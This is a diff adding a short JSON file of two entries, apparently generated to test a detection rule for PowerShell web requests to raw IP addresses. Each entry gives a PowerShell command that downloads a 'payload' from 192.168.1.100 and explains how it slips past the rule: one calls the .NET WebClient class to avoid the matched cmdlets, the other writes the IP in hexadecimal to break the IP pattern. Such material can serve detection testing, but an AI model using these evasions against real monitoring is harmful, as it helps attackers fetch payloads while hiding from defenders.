@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell.exe -Command \"[System.Net.WebClient]::new().DownloadString('[http://192.168.1.100/payload]()')\"",
+    "explanation": "The rule explicitly triggers on specific PowerShell web request cmdlets or their short aliases (such as 'iwr ', 'curl ', 'Invoke-WebRequest'). By using the native .NET class '[System.Net.WebClient]' or '[System.Net.Http.HttpClient]' directly inside PowerShell, the 'selection_commands' match group is entirely bypassed while still performing a direct IP network connection."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri '[http://0xc0a80164/payload]()'\"",
+    "explanation": "The 'selection_ip' block relies on identifying a numerical start character immediately following the protocol schema (e.g., '://1', '://2'). Converting the target IP address into alternative notation formats, such as its hexadecimal equivalent (e.g., '0xc0a80164' for '192.168.1.100') or an integer value, breaks the string pattern match while Windows still resolves and reaches the target IP safely."
+  }
+]
